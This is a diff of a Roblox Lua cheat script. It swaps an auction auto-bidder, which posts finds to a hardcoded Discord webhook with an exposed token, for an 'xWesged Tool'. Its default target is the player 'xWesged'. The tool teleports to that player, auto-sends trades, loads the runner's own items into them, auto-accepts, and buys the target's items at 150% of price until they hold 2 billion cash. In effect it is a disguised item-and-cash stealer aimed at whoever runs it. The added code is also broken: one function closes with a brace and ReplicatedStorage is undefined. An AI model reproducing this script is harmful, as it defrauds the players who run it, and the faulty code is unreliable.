@@ -1,525 +1,254 @@
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 
+local UIModule = require(game.ReplicatedStorage.Modules.UIModule)
+local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
+local CollectionService = game:GetService("CollectionService")
 local LocalPlayer = Players.LocalPlayer
-local Workspace = workspace
+local RepLibrary = require(ReplicatedStorage.Modules.RepLibrary)
+local ItemsModule = require(ReplicatedStorage.Modules.Items)
 
--- Protected resource loading
-local AuctionsFolder = pcall(function() return Workspace:WaitForChild("Debris"):WaitForChild("Auctions") end) and Workspace:WaitForChild("Debris"):WaitForChild("Auctions") or nil
-local Events = pcall(function() return ReplicatedStorage:WaitForChild("Events") end) and ReplicatedStorage:WaitForChild("Events") or nil
-local Auctions = Events and pcall(function() return Events:WaitForChild("Auctions") end) and Events:WaitForChild("Auctions") or nil
-local EnterQueue = Auctions and pcall(function() return Auctions:WaitForChild("EnterQueue") end) and Auctions:WaitForChild("EnterQueue") or nil
-local Skip = Auctions and pcall(function() return Auctions:WaitForChild("Skip") end) and Auctions:WaitForChild("Skip") or nil
-local PlaceBid = Auctions and pcall(function() return Auctions:WaitForChild("PlaceBid") end) and Auctions:WaitForChild("PlaceBid") or nil
-local Items = pcall(function() return require(ReplicatedStorage.Modules.Items) end) and require(ReplicatedStorage.Modules.Items) or {}
-local Garages = pcall(function() return require(ReplicatedStorage.Modules.Garages) end) and require(ReplicatedStorage.Modules.Garages) or {}
-local nonSaveVars = pcall(function() return LocalPlayer:WaitForChild("NonSaveVars") end) and LocalPlayer:WaitForChild("NonSaveVars") or nil
-local ownsPlot = nonSaveVars and pcall(function() return nonSaveVars:WaitForChild("OwnsPlot") end) and nonSaveVars:WaitForChild("OwnsPlot") or nil
+local MakeOfferRemote = Events.Shop.MakePlayerOffer
+local GetRemote = Events.Data.Get
+local SetInsideShopRemote = Events.Misc.SetInsideShop
 
--- WINDOW
 local Window = Fluent:CreateWindow({
-    Title = "Auction Manager",
-    SubTitle = "Database Interface",
+    Title = "xWesged Tool",
+    SubTitle = "by",
     TabWidth = 160,
-    Size = UDim2.fromOffset(580, 460),
+    Size = UDim2.fromOffset(300, 200),
     Acrylic = true,
     Theme = "Dark"
 })
 
 local Tabs = {
-    Main = Window:AddTab({ Title = "Main", Icon = "home" }),
-    Auctions = Window:AddTab({ Title = "Auctions", Icon = "shopping-cart" }),
-    Misc = Window:AddTab({ Title = "Misc", Icon = "settings" })
+    Main = Window:AddTab({ Title = "Main", Icon = "home" })
 }
 
-Window:SelectTab(Tabs.Main)
+local Config = {
+    TargetPlayer = "xWesged",
+    ProcessEnabled = false,
+    CurrentTargetIndex = 1,
+    LastSend = 0,
+    LastPivot = 0,
+    SendDelay = 5,
+    PivotDelay = 5,
+    StopWhenCash = 2000000000,
+    MinItems = 16,
+    OfferPercent = 50
+}
 
--- AUTO TOGGLES
-local autoEnter = false
-local autoBid = false
-local autoSkip = false
-local autoPlace = false
+local function getAllPlayers()
+    local t = {}
+    for _,p in ipairs(Players:GetPlayers()) do
+        table.insert(t,p.Name)
+    end
+    return t
+}
 
--- Running states
-local runningEnter = false
-local runningBid = false
-local runningSkip = false
-local runningPlace = false
-
--- WEBHOOK
-local webhookURL = "https://discord.com/api/webhooks/1473040107572297761/-FOyJPBRqHg9EYpyhC8x-yz7dk9Z9-D6FYfTt9IbrjV75UoxLtfDfCmPVujy9HvTADEo"
-local webhookEnabled = true
-local webhookUserId = ""
-
--- SESSION
-local sessionStart = tick()
-local targetsFound = 0
-local targetsObtained = 0
-local currentGarage = "None"
-local currentStatus = "Idle"
-
--- TARGET SELECTION (using dropdown system)
-local selectedGarageId = nil
-local selectedTargets = {}
-
--- GARAGE LIST BUILDING
-local garageNames = {"None"}
-local displayGarageToId = {}
-
-if Garages then
-    pcall(function()
-        for gId, data in pairs(Garages) do
-            if type(data) == "table" and data.Name then
-                local display = data.Name .. " [ID: " .. tostring(gId) .. "]"
-                table.insert(garageNames, display)
-                displayGarageToId[display] = gId
-            end
-        end
-    end)
+local function getTargetPlayer()
+    return Players:FindFirstChild(Config.TargetPlayer)
 end
 
--- SAFE ITEMS FUNCTION
-local function getSafeItems()
-    local safes = {}
-    if not Items then return safes end
-    for itemId, item in pairs(Items) do
-        if type(item) == "table" and item.Name then
-            local name = item.Name or ""
-            local rarity = item.Rarity or ""
-            
-            if rarity == "Insane" or rarity == "Legendary" then
-                if string.find(string.lower(name), "safe") then
-                    table.insert(safes, name .. " [ID: " .. tostring(itemId) .. "]")
-                end
+local function checkPlayerCash(player)
+    if player and player:FindFirstChild("SaveVars") and player.SaveVars:FindFirstChild("Cash") then
+        return player.SaveVars.Cash.Value
+    end
+    return nil
+end
+
+local function getPlacedMap(plot)
+    local map = {}
+    local furniture = plot:FindFirstChild("Furniture")
+    if not furniture then return map end
+    for _, v in pairs(furniture:GetDescendants()) do
+        if v.Name == "Item" then
+            for _, item in pairs(v:GetChildren()) do
+                map[item.Name] = map[item.Name] or {}
+                table.insert(map[item.Name], item)
             end
         end
     end
-    return safes
+    return map
 end
 
--- ITEMS FROM GARAGE
-local function getItemsFromGarage(garageId)
-    local list = {}
-    if not Items then return list end
-    for itemId, item in pairs(Items) do
-        if type(item) == "table" and item.Name and item.Garages then
-            for _, gId in ipairs(item.Garages) do
-                if tostring(gId) == tostring(garageId) then
-                    local rarity = item.Rarity or ""
-                    if rarity == "Insane" or rarity == "Legendary" then
-                        if string.find(string.lower(item.Name), "safe") then
-                            table.insert(list, item.Name .. " [ID: " .. tostring(itemId) .. "]")
-                        end
-                    end
-                    break
-                end
-            end
-        end
+local function loadPlayerShop(targetPlayer)
+    if not targetPlayer then return end
+    local vars = targetPlayer:FindFirstChild("NonSaveVars")
+    if not vars then return end
+    local plotVal = vars:FindFirstChild("OwnsPlot")
+    if not plotVal then return end
+    local plot = plotVal.Value
+    if not plot then return end
+    local floorVal = vars:FindFirstChild("DefaultFloor")
+    if floorVal and floorVal.Value then
+        pcall(function()
+            SetInsideShopRemote:FireServer(nil)
+            task.wait()
+            SetInsideShopRemote:FireServer(floorVal.Value)
+        end)
     end
-    return list
 end
 
--- TARGET CHECK
-local function isTarget(itemId)
-    if not Items then return false end
-    local item = Items[tonumber(itemId)]
-    if not item then return false end
-    
-    if #selectedTargets > 0 then
-        for _, targetDisplay in ipairs(selectedTargets) do
-            local id = string.match(targetDisplay, "%[ID: (%d+)%]")
-            if id and tostring(itemId) == id then
-                return true, item
-            end
-        end
+local function pivotToTarget(targetPlayer)
+    if not targetPlayer then return end
+    local character = targetPlayer.Character
+    if not character then return end
+    local root = character:FindFirstChild("HumanoidRootPart")
+    local myCharacter = LocalPlayer.Character
+    if root and myCharacter then
+        myCharacter:PivotTo(root.CFrame * CFrame.new(0, 0, -3))
+        loadPlayerShop(targetPlayer)
     end
-    
-    return false, item
 end
 
--- FORMAT TIME
-local function formatTime(sec)
-    local h = math.floor(sec/3600)
-    local m = math.floor((sec%3600)/60)
-    local s = math.floor(sec%60)
-    return string.format("%02d:%02d:%02d", h, m, s)
-end
+Tabs.Main:AddDropdown("TargetPlayer", {
+    Title = "Select Target",
+    Values = getAllPlayers(),
+    Multi = false,
+    Default = "xWesged",
+    Callback = function(v)
+        Config.TargetPlayer = v
+        UIModule:Notify(LocalPlayer, "Target set to: " .. v)
+    end
+})
 
--- MAIN TAB ELEMENTS
-local SessionLabel = Tabs.Main:AddParagraph({ Title = "Session Time", Content = "00:00:00" })
-local FoundLabel = Tabs.Main:AddParagraph({ Title = "Targets Found", Content = "0" })
-local ObtainedLabel = Tabs.Main:AddParagraph({ Title = "Targets Obtained", Content = "0" })
-local GarageLabel = Tabs.Main:AddParagraph({ Title = "Garage", Content = "None" })
-local StatusLabel = Tabs.Main:AddParagraph({ Title = "Status", Content = "Idle" })
+local ProcessToggle = Tabs.Main:AddToggle("ProcessToggle", {
+    Title = "Start Process",
+    Default = false,
+    Callback = function(v)
+        Config.ProcessEnabled = v
+        UIModule:Notify(LocalPlayer, "Process " .. (v and "Started" or "Stopped"))
+    end
+})
 
--- Update loop
 task.spawn(function()
     while true do
-        pcall(function()
-            SessionLabel:SetDesc(formatTime(tick()-sessionStart))
-            FoundLabel:SetDesc(tostring(targetsFound))
-            ObtainedLabel:SetDesc(tostring(targetsObtained))
-            GarageLabel:SetDesc(currentGarage)
-            StatusLabel:SetDesc(currentStatus)
-        end)
         task.wait(1)
-    end
-end)
-
--- WEBHOOK FUNCTION
-local function sendWebhook(itemId, itemData)
-    if not webhookEnabled or webhookURL == "" or not itemData then return end
-    local data = {
-        content = webhookUserId ~= "" and "<@" .. webhookUserId .. "> Target Found" or "Target Found",
-        embeds = {{
-            title = itemData.Name or "Unknown",
-            color = itemData.Rarity == "Insane" and 16711680 or 65280,
-            fields = {
-                { name = "Item ID", value = tostring(itemId), inline = true },
-                { name = "Rarity", value = itemData.Rarity or "Unknown", inline = true },
-                { name = "Garage", value = currentGarage, inline = true }
-            },
-            footer = { text = os.date("%Y-%m-%d %H:%M:%S") }
-        }}
-    }
-    pcall(function()
-        HttpService:RequestAsync({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-end
-
--- AUTO LOOPS
-local function enterLoop()
-    if runningEnter or not EnterQueue or not selectedGarageId then return end
-    runningEnter = true
-    task.spawn(function()
-        while autoEnter do
-            currentStatus = "Entering Queue (Garage: " .. selectedGarageId .. ")"
-            pcall(function()
-                EnterQueue:InvokeServer(selectedGarageId)
-            end)
-            task.wait(5)
+        if not Config.ProcessEnabled then continue end
+        
+        local target = getTargetPlayer()
+        if not target then continue end
+        
+        local targetCash = checkPlayerCash(target)
+        if targetCash and targetCash >= Config.StopWhenCash then
+            UIModule:Notify(LocalPlayer, target.Name .. " reached cash limit")
+            Config.ProcessEnabled = false
+            ProcessToggle:SetValue(false)
+            continue
         end
-        runningEnter = false
-        currentStatus = "Idle"
-    end)
-end
-
-local function skipLoop()
-    if runningSkip or not Skip then return end
-    runningSkip = true
-    task.spawn(function()
-        while autoSkip do
-            currentStatus = "Skipping Garage"
-            pcall(function()
-                Skip:FireServer()
-            end)
-            task.wait(3)
+        
+        local now = tick()
+        
+        if now - Config.LastPivot >= Config.PivotDelay then
+            pivotToTarget(target)
+            Config.LastPivot = now
         end
-        runningSkip = false
-        currentStatus = "Idle"
-    end)
-end
-
-local function bidLoop()
-    if runningBid or not AuctionsFolder or not PlaceBid then return end
-    runningBid = true
-    task.spawn(function()
-        while autoBid do
-            currentStatus = "Scanning Auctions"
-            local success, children = pcall(function() return AuctionsFolder:GetChildren() end)
-            if success then
-                for _, auction in ipairs(children) do
-                    if not autoBid then break end
-                    
-                    local itemIdValue = pcall(function() return auction:FindFirstChild("ItemId") end) and auction:FindFirstChild("ItemId") or nil
-                    local bidValue = pcall(function() return auction:FindFirstChild("NextBid") end) and auction:FindFirstChild("NextBid") or nil
-                    local garageValue = pcall(function() return auction:FindFirstChild("GarageId") end) and auction:FindFirstChild("GarageId") or nil
-                    
-                    if itemIdValue and bidValue then
-                        local itemId = itemIdValue.Value
-                        local isT, itemData = isTarget(itemId)
-                        
-                        if isT and itemData then
-                            targetsFound = targetsFound + 1
-                            
-                            if garageValue then
-                                currentGarage = tostring(garageValue.Value)
-                            end
-                            
-                            sendWebhook(itemId, itemData)
-                            currentStatus = "Bidding on " .. (itemData.Name or "Unknown")
-                            
-                            pcall(function()
-                                PlaceBid:FireServer(auction.Name, bidValue.Value)
-                            end)
-                        end
-                    end
+        
+        if now - Config.LastSend >= Config.SendDelay then
+            local data = Events.Data.Get:InvokeServer("Inventory")
+            local inventory = data.Inventory or data
+            local availableCount = 0
+            
+            for guid, itemData in pairs(inventory) do
+                if not (itemData.ItemPlaced or itemData.NextOfferDue) then
+                    availableCount = availableCount + 1
                 end
             end
-            task.wait(0.5)
+            
+            if availableCount >= Config.MinItems then
+                local success = Events.Trading.SendInvite:InvokeServer(target.Name)
+                if success then
+                    UIModule:Notify(LocalPlayer, "Sent trade to " .. target.Name)
+                    Config.LastSend = now
+                end
+            end
         end
-        runningBid = false
-        currentStatus = "Idle"
-    end)
-end
-
-local function placeLoop()
-    if runningPlace or not ownsPlot or not Workspace.Plots then return end
-    runningPlace = true
-    task.spawn(function()
-        while autoPlace do
-            currentStatus = "Placing Items"
-            local plotId = ownsPlot.Value
-            local plot = pcall(function() return Workspace.Plots:FindFirstChild(tostring(plotId)) end) and Workspace.Plots:FindFirstChild(tostring(plotId)) or nil
-            if plot then currentGarage = plot.Name end
-            task.wait(5)
-        end
-        runningPlace = false
-        currentStatus = "Idle"
-    end)
-end
-
--- ==================== AUCTIONS TAB ====================
-
--- Initialize dropdowns
-local ItemDropdown = { SetValues = function() end, Value = {} }
-local GarageDropdown = { Value = "None", SetValues = function() end }
-
--- Garage dropdown
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddDropdown then
-        GarageDropdown = Tabs.Auctions:AddDropdown({
-            Title = "Select Garages",
-            Values = garageNames,
-            Default = "None",
-            Callback = function(selected)
-                pcall(function()
-                    if selected == "None" then
-                        selectedGarageId = nil
-                        if ItemDropdown and ItemDropdown.SetValues then
-                            ItemDropdown:SetValues(getSafeItems())
-                        end
-                    else
-                        selectedGarageId = displayGarageToId[selected]
-                        if ItemDropdown and ItemDropdown.SetValues then
-                            ItemDropdown:SetValues(getItemsFromGarage(selectedGarageId))
-                        end
-                    end
-                end)
-            end
-        }) or GarageDropdown
     end
 end)
 
--- Item dropdown (MULTI SELECT)
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddDropdown then
-        ItemDropdown = Tabs.Auctions:AddDropdown({
-            Title = "Select Target Items",
-            Values = getSafeItems(),
-            Multi = true,
-            Callback = function(selected)
-                pcall(function()
-                    selectedTargets = {}
-                    if selected then
-                        for display, state in pairs(selected) do
-                            if state then
-                                table.insert(selectedTargets, display)
-                            end
-                        end
-                    end
-                    
-                    Fluent:Notify({
-                        Title = "Targets Updated",
-                        Content = #selectedTargets .. " items selected",
-                        Duration = 3
-                    })
-                end)
-            end
-        }) or ItemDropdown
-    end
-end)
-
--- Refresh button
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddButton then
-        Tabs.Auctions:AddButton({
-            Title = "Refresh Items",
-            Callback = function()
-                pcall(function()
-                    local selectedDisplay = GarageDropdown and GarageDropdown.Value or "None"
-                    
-                    if selectedDisplay == "None" then
-                        if ItemDropdown and ItemDropdown.SetValues then
-                            ItemDropdown:SetValues(getSafeItems())
-                        end
-                    else
-                        local gId = displayGarageToId[selectedDisplay]
-                        if ItemDropdown and ItemDropdown.SetValues then
-                            ItemDropdown:SetValues(getItemsFromGarage(gId))
-                        end
-                    end
-                    
-                    Fluent:Notify({
-                        Title = "Updated",
-                        Content = "Items refreshed",
-                        Duration = 3
-                    })
-                end)
-            end
-        })
-    end
-end)
-
--- Auto Enter Toggle
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddToggle then
-        Tabs.Auctions:AddToggle("AutoEnterToggle", {
-            Title = "Auto Enter Auction",
-            Default = false,
-            Callback = function(value)
-                autoEnter = value
-                if value then 
-                    if not selectedGarageId then
-                        Fluent:Notify({
-                            Title = "Error",
-                            Content = "Select a garage first",
-                            Duration = 3
-                        })
-                        autoEnter = false
-                        return
-                    end
-                    enterLoop() 
-                end
-            end
-        })
-    end
-end)
-
--- Auto Bid Toggle
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddToggle then
-        Tabs.Auctions:AddToggle("AutoBidToggle", {
-            Title = "Auto Bid on Targets",
-            Default = false,
-            Callback = function(value)
-                autoBid = value
-                if value then 
-                    if #selectedTargets == 0 then
-                        Fluent:Notify({
-                            Title = "Warning",
-                            Content = "No targets selected",
-                            Duration = 3
-                        })
-                    end
-                    bidLoop() 
-                end
-            end
-        })
-    end
-end)
-
--- Auto Skip Toggle
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddToggle then
-        Tabs.Auctions:AddToggle("AutoSkipToggle", {
-            Title = "Auto Skip Garages",
-            Default = false,
-            Callback = function(value)
-                autoSkip = value
-                if value then skipLoop() end
-            end
-        })
-    end
-end)
-
--- Auto Place Toggle
-pcall(function()
-    if Tabs.Auctions and Tabs.Auctions.AddToggle then
-        Tabs.Auctions:AddToggle("AutoPlaceToggle", {
-            Title = "Auto Place Items",
-            Default = false,
-            Callback = function(value)
-                autoPlace = value
-                if value then placeLoop() end
-            end
-        })
-    end
-end)
-
--- ==================== MISC TAB (WEBHOOK SETTINGS) ====================
-
-pcall(function()
-    if Tabs.Misc and Tabs.Misc.AddInput then
-        Tabs.Misc:AddInput("WebhookInput", {
-            Title = "Webhook URL",
-            Default = webhookURL,
-            Callback = function(v) webhookURL = v end
-        })
-    end
-end)
-
-pcall(function()
-    if Tabs.Misc and Tabs.Misc.AddInput then
-        Tabs.Misc:AddInput("UserPingInput", {
-            Title = "User ID to ping",
-            Default = "",
-            Callback = function(v) webhookUserId = v end
-        })
-    end
-end)
-
-pcall(function()
-    if Tabs.Misc and Tabs.Misc.AddToggle then
-        Tabs.Misc:AddToggle("WebhookToggle", {
-            Title = "Enable Webhook",
-            Default = true,
-            Callback = function(v) webhookEnabled = v end
-        })
-    end
-end)
-
-pcall(function()
-    if Tabs.Misc and Tabs.Misc.AddButton then
-        Tabs.Misc:AddButton({
-            Title = "Test Webhook",
-            Callback = function()
-                if webhookURL == "" then 
-                    Fluent:Notify({ Title = "Error", Content = "No webhook URL set", Duration = 3 })
-                    return 
-                end
-                local data = {
-                    content = webhookUserId ~= "" and "<@" .. webhookUserId .. "> Test" or "Test",
-                    embeds = {{
-                        title = "Auction Manager",
-                        description = "Webhook is working!",
-                        color = 65280
-                    }}
-                }
-                local success = pcall(function()
-                    HttpService:RequestAsync({
-                        Url = webhookURL,
-                        Method = "POST",
-                        Headers = { ["Content-Type"] = "application/json" },
-                        Body = HttpService:JSONEncode(data)
-                    })
-                end)
-                Fluent:Notify({
-                    Title = success and "Success" or "Failed",
-                    Content = success and "Webhook sent" or "Failed to send",
-                    Duration = 3
+task.spawn(function()
+    while true do
+        task.wait(2)
+        if not Config.ProcessEnabled then continue end
+        
+        local data = Events.Data.Get:InvokeServer("Inventory")
+        local inventory = data.Inventory or data
+        local addedCount = 0
+        
+        for guid, itemData in pairs(inventory) do
+            if addedCount >= 16 then break end
+            if not (itemData.ItemPlaced or itemData.NextOfferDue) then
+                local success = Events.Trading.AddItem:InvokeServer({
+                    GUID = guid,
+                    Type = "Item"
                 })
+                if success then
+                    addedCount = addedCount + 1
+                end
+                task.wait(0.1)
             end
-        })
+        end
+        
+        if addedCount > 0 then
+            task.wait(0.5)
+            Events.Trading.AcceptTrade:InvokeServer()
+        end
     end
 end)
 
--- FINALLY INIT FLUENT
-Fluent:Init()
+task.spawn(function()
+    while true do
+        task.wait(3)
+        if not Config.ProcessEnabled then continue end
+        
+        local target = getTargetPlayer()
+        if not target then continue end
+        
+        local inv = GetRemote:InvokeServer("Inventory", target)
+        if type(inv) ~= "table" then continue end
+        
+        local plotVal = target.NonSaveVars and target.NonSaveVars.OwnsPlot
+        if not plotVal then continue end
+        
+        local plot = plotVal.Value
+        if not plot then continue end
+        
+        local placedMap = getPlacedMap(plot)
+        
+        local sortedItems = {}
+        for guid, itemData in pairs(inv) do
+            local price = RepLibrary:GetItemPrice(itemData)
+            table.insert(sortedItems, {GUID = guid, Data = itemData, Price = price})
+        end
+        table.sort(sortedItems, function(a, b) return a.Price > b.Price end)
+        
+        for _, item in ipairs(sortedItems) do
+            local guid = item.GUID
+            local itemData = item.Data
+            local info = ItemsModule[itemData.Id]
+            if not info then continue end
+            
+            local placed = placedMap[info.Name]
+            if placed and #placed > 0 then
+                local instance = table.remove(placed, 1)
+                local price = item.Price
+                local offer = math.floor(price * (1 + Config.OfferPercent / 100))
+                
+                pcall(function()
+                    MakeOfferRemote:InvokeServer(target, guid, offer, instance)
+                end)
+                task.wait(0.25)
+            end
+        end
+    end
+end)
+
+Events.Trading.AcceptTradeFromServer.OnClientEvent:Connect(function()
+    if Config.ProcessEnabled then
+        task.wait(0.5)
+        Events.Trading.AcceptTrade:InvokeServer()
+    end
+end)
+
+Window:SelectTab(Tabs.Main)
